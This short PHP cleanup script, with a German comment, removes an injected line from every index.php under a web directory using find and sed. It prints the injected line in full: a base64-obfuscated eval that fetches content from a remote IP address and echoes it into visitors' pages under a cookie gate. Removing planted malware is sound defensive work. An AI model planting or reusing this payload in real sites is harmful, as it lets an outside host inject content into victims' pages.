<?php
#Löscht aus Verzeichnis gewünschte Zeile
#mm@ssi.at am 15.Juni 2018

$text = "<?php eval(base64_decode('JGEgPSBmaWxlX2dldF9jb250ZW50cygiaHR0cDovLzE4NS4xNDUuMjUzLjE3Ny9rLnBocCIpOw0KDQppZigkYSAhPSAibnVsbCIpew0KaWYgKCFpc3NldCgkX0NPT0tJRVsnc2hvd3N0dWZmJ10pKXsNCmVjaG8gJGE7DQpzZXRjb29raWUoJ3Nob3dzdHVmZicsIHRydWUsICB0aW1lKCkrNDMyMDApOw0KfSBlbHNlIHsNCg0KfQ0KfQ==')); ?>';";

exec ("find /var/www/ssi/ -name 'index.php' -exec sed -i 's@$text@@g' {} \;");